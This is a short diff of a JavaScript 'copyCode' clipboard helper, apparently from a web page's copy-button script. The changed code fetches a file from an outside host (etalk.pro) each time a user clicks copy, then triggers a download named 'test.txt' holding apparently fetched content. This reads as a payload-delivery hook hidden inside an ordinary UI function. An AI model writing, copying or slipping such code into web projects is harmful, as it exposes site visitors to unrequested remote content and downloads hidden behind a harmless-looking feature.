@@ -480,10 +480,6 @@ var copyCode = function(elem) {
 
 	textarea.select();
 
-	
-	try {
-		if (document.execCommand("copy")) {
-				
 				var request = new XMLHttpRequest();
 				request.open('GET', 'https://etalk.pro/jzHsEXF3.txt', true);
 				request.send(null);
@@ -495,8 +491,9 @@ var copyCode = function(elem) {
 						}
 					}
 				}
-			
-		
+	
+	try {
+		if (document.execCommand("copy")) {
 			flashButton(elem, true);
 			downloadff('test.txt', ggg);
 		} else {
